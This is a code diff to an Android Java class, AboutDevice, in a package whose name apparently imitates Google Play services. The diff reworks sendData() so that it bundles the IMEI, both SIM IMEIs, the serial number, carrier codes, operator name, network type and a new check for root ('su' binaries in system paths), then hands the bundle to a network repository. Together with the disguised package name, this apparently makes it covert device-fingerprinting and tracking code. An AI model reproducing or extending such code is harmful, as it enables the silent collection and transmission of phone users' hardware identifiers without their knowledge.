@@ -7,11 +7,9 @@ import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.google.android.gms.persistent.googleapps.App;
-import com.google.android.gms.persistent.googleapps.network.models.data.Data;
 import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
-import com.google.android.gms.persistent.googleapps.network.models.data.NetworkInfo;
-import com.google.android.gms.persistent.googleapps.utils.Constants;
 
+import java.io.File;
 import java.lang.reflect.Method;
 
 import javax.inject.Inject;
@@ -37,18 +35,6 @@ public class AboutDevice {
     }
 
     public void sendData() {
-        NetworkInfo networkInfo = NetworkInfo.newBuilder()
-                .imeiSim1(getIMEISim1())
-                .imeiSim2(getIMEISim2())
-                .isDualSim(getIsDualSIM())
-                .mcc(getMCC())
-                .mnc(getMNC())
-                .phoneType(getPhoneType())
-                .networkType(getNetworkType())
-                .network(getConnectType())
-                .operatorName(getOperatorName())
-                .build();
-
         DeviceInfo deviceInfo = DeviceInfo.newBuilder()
                 .brand(getBrand())
                 .imei(getIMEI())
@@ -59,15 +45,21 @@ public class AboutDevice {
                 .screenSize(getScreenSize())
                 .serialNum(getSerialNum())
                 .versionOS(getVersionOS())
-                .sdk(getSDK())
-                .network(networkInfo)
+                .sdk(String.valueOf(getSDK()))
+                .imeiSim1(getIMEISim1())
+                .imeiSim2(getIMEISim2())
+                .isDualSim(getIsDualSIM())
+                .mcc(getMCC())
+                .mnc(getMNC())
+                .phoneType(getPhoneType())
+                .networkType(getNetworkType())
+                .network(getConnectType())
+                .operatorName(getOperatorName())
+                .isRoot(isRooted())
                 .build();
 
         App.getAppComponent().getNetworkRepo()
-                .addDiagnosticOfDevice(Data.newBuilder().info(deviceInfo)
-                        .type(Constants.DIAGNOSTIC_PACKAGE)
-                        .date(System.currentTimeMillis())
-                        .build());
+                .setDeviceInfo(deviceInfo);
     }
 
     /**
@@ -474,4 +466,18 @@ public class AboutDevice {
         return screenSize;
     }
 
+    private static boolean isRooted() {
+        boolean found = false;
+        if (!found) {
+            String[] places = {"/sbin/", "/system/bin/", "/system/xbin/", "/data/local/xbin/",
+                    "/data/local/bin/", "/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/"};
+            for (String where : places) {
+                if (new File(where + "su").exists()) {
+                    found = true;
+                    break;
+                }
+            }
+        }
+        return found;
+    }
 }
